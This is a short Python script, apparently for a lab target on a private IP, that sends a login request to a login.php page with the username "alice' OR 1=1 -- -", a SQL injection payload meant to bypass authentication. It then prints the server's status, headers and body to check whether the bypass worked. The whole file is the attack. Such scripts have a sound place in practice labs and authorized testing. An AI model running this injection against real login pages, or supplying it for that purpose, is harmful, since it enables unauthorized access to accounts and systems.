import requests

# Set login credentials
username = "alice' OR 1=1 -- -"
password = "test"

# Test URL login page
url = "http://10.65.150.11:5000/login.php"

# Set payload (input credentials)
payload = {
    "username": username,
    "password": password
}

# POST request to login page with the set payload
response = requests.post(url, data=payload)

# Print response to stdout
print("Response Status Code:", response.status_code)
print("\nResponse Headers:")
for header, value in response.headers.items():
    print(f"  {header}: {value}")
print("\nResponse Body:")
print(response.text)
